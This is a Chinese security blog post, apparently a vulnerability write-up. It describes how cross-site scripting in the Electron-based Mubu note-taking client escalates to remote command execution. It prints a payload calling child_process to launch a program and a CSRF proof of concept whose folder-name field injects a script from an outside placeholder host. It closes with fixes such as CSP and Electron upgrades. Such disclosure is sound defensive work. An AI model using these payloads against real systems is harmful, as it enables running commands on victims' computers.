<!DOCTYPE html>
<html lang="zh-CN">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width">
	<title>幕布(mubu.com) Client 远程命令执行 &ndash; # alert`D0n9` ｜ 输攻墨守</title>
	<link rel="stylesheet" href="/css/styles.css">
    <link rel="stylesheet" href="/css/nav.css">
    
    
    
    
    
	<link rel="stylesheet" href="/css/themes/light.css">
</head>
<body>
	<input class="show-hide-menu-input" style="display:none;" autocomplete="off" type="checkbox" id="toggle-1">
	<label class="overlay" for="toggle-1"></label>
	<div class="main">
		<header class="header">
			<div class="header-content">
				<div class="title">
					<a href="https://d0n9.github.io/"># alert`D0n9` ｜ 输攻墨守</a>
				</div>
				<div>
					<div class="header-right">
						<label id="show-hide-menu-label" class="clickable-header-label" for="toggle-1">
							<img class="color-adapting-image" width="30" src="/images/hamburger.svg" alt="menu button">
						</label>
					</div>
					<div class="dont-show">
						<p>
							Links:
						</p>
					</div>
					<ul class="links">
						<li><a href="/">Home</a></li>
						<li><a href="/posts/">Posts</a></li>
						<li><a href="/about-me/">About Me</a></li>
						<li><a href="/tags/">Tags</a></li>
					</ul>
				</div>
			</div>
		</header>
		<main class="body">
			<div class="body-content">
  <header class="title-header">
    <h1>幕布(mubu.com) Client 远程命令执行</h1>
    <div class="title-header-date">
        <time>Saturday, December 16, 2017</time>
    </div>
    
  </header>
  <p>uodate</p>
<p>一位安全研究员对幕布客户端的最新研究</p>
<p><a href="https://xz.aliyun.com/t/4910">https://xz.aliyun.com/t/4910</a></p>
<hr>
<blockquote>
<p>幕布(mubu.com)是一款头脑管理工具，用更高效的方式和清晰的结构来记录笔记、管理任务、制定工作计划、头脑风暴。用最好的方式释放您的大脑！</p>
</blockquote>
<p>幕布使用 Electron 框架开发，想要验证这一点很容易，在 /Applications/幕布.app/Contents/ 可以可以发现一些 Electron 框架的信息</p>
<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/12/202402171649832.jpg" alt=""></p>
<p>Electron 基于 Chromium 和 Node.js, 使用 HTML, CSS 和 JavaScript 来快速开发桌面程序。近几年发展迅猛，很多我们熟知的app其实都是Electron开发的，比如 vscode、atom、GitHub Desktop 等</p>
<p>在Black Hat Briefings 2017上国外安全研究员<a href="https://www.blackhat.com/us-17/speakers/Luca-Carettoni.html">Luca Carettoni</a>发表了一篇议题 <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Carettoni-Electronegativity-A-Study-Of-Electron-Security.pdf">ELECTRONEGATIVITY - A STUDY OF ELECTRON SECURITY</a></p>
<p>简单来说就是可以利用JavaScript执行系统命令，进而XSS跨站脚本攻击变成RCE远程命令执行</p>
<p>所以先要找到一个XSS漏洞，macOS上幕布1.1.0 版本有很多地方存在XSS，比如在搜索框输入JavaScript代码可正常执行
<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/12/202402171649642.jpg" alt="">
试试弹计算器的Payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;text/javascript&#34;</span><span class="o">&gt;</span>   <span class="nb">window</span><span class="p">.</span><span class="nx">top</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">execFile</span><span class="p">(</span><span class="s1">&#39;/Applications/Calculator.app/Contents/MacOS/Calculator&#39;</span><span class="p">,</span><span class="kd">function</span><span class="p">(){});</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/12/202402171649450.jpg" alt="">
但是搜索框这个位置也只能影响到自己而已，还需要找到能够攻击别人XSS漏洞才够完美。
找呀找，发现文件夹名也能XSS，但也没办法攻击到别人，除非找到CSRF 创建文件夹或者越权更改文件夹名字的漏洞才行。
<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/12/202402171650931.jpg" alt="">
在Web版发现创建文件夹的CSRF漏洞</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;https://mubu.com/api/list/create_folder&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;folderId&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;0&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;name&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;&lt;img/src=x onerror=s=document.createElement(&#39;script&#39;);s.src=&#39;http://xxx&#39;;document.head.appendChild(s);&gt;&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Submit request&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>有对一些敏感的标签做检查，黑名单策略很容易绕过，注入外部js时又遇到问题，因为页面是https并且 Referrer Policy:no-referrer-when-downgrade 所以不能降级加载http的资源，也没有https的域名只能作罢
前面说到可以XSS的地方有很多，比如文档标题在查看思维导图功能可以执行
<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/12/202402171650336.jpg" alt="">
当然在Client也是可以执行的，还没有no-referrer-when-downgrade的限制，可以通过文档分享功能进行传播
<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/12/202402171650468.jpg" alt="">
在用户昵称处存在XSS问题，保存功能存在CSRF，综合利用可以悄无声息保存文档，一旦用户在客户端打开即可触发执行命令
<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/12/202402171650853.gif" alt=""></p>
<p>修复：</p>
<p>其核心问题还是XSS问题，通常会建议使用CSP进行限制脚本执行，比如大名鼎鼎的VScode就是使用CSP，script-src 设置为self，仅允许同源的js加载，另外也要使用高版本Electron框架，因为Electron也是在不断完善迭代，新版会修复一些安全问题。</p>
<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/12/202402171651254.jpg" alt=""></p>

  
  
  <div class="post-tags">
    <p>Tags: 
    
      <a href="/tags/rce">RCE</a>
    
      <a href="/tags/web%E5%AE%89%E5%85%A8">Web安全</a>
    
    </p>
  </div>
  

			</div>
		</main>
	</div>
	<hr class="dont-show">
	<footer class="footer">
		<p>Powered by <a href="https://gohugo.io/">Hugo</a> &amp; <a href="https://github.com/stevenengler/no-js-hugo-theme">no-js-hugo-theme</a></p>
	</footer>
</body>
</html>
